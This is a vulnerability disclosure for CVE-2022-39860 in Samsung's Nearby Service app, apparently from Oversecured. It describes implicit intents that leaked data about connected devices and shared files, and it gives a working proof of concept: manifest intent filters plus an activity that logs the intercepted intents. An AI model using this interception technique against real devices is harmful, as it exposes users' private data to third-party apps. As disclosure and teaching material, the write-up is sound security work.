# Details

<table>
    <tr>
        <td>Name</td>
        <td>Nearby Service</td>
    </tr>
    <tr>
        <td>Package name</td>
        <td><code>com.samsung.android.allshare.service.mediashare</code></td>
    </tr>
    <tr>
        <td>Reported date</td>
        <td>2022.03.26</td>
    </tr>
    <tr>
        <td>Fixed date</td>
        <td>2022.10.04</td>
    </tr>
    <tr>
        <td>Severity</td>
        <td>Moderate</td>
    </tr>
    <tr>
        <td>Handle</td>
        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-39860">CVE-2022-39860</a> (SVE-2022-0754)</td>
    </tr>
    <tr>
        <td>Reward</td>
        <td>$350</td>
    </tr>
</table>

# Description

Oversecured found three uses of implicit intents when starting activities:
![](Oversecured_report.png)

These intents disclosed data about the connected devices and shared files to third-party apps installed on the same device.

**Proof of Concept**

File `AndroidManifest.xml`:
```xml
<activity android:name=".InterceptActivity" android:exported="true">
    <intent-filter android:priority="999">
        <action android:name="com.samsung.android.allshare.service.aware.client.CLIENT_SEND_FILES" />
        <category android:name="android.intent.category.DEFAULT" />
    </intent-filter>
    <intent-filter android:priority="999">
        <action android:name="com.samsung.android.aware.service.START_RECEIVING" />
        <category android:name="android.intent.category.DEFAULT" />
    </intent-filter>
    <intent-filter android:priority="999">
        <action android:name="com.samsung.android.allshare.service.aware.client.CLIENT_CANCEL_TRANSFER" />
        <category android:name="android.intent.category.DEFAULT" />
    </intent-filter>
</activity>
```

File `InterceptActivity.java`:
```java
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);

    DumpUtils.dump(getIntent(), getClassLoader());
    finish();
}
```

The implementation of the `DumpUtils.dump()` method can be found in the source code. We use the functionality of the Gson library to turn objects of any class into a string and then dump it to the log.

## References

- [Oversecured Blog. Interception of Android implicit intents](https://blog.oversecured.com/Interception-of-Android-implicit-intents/)
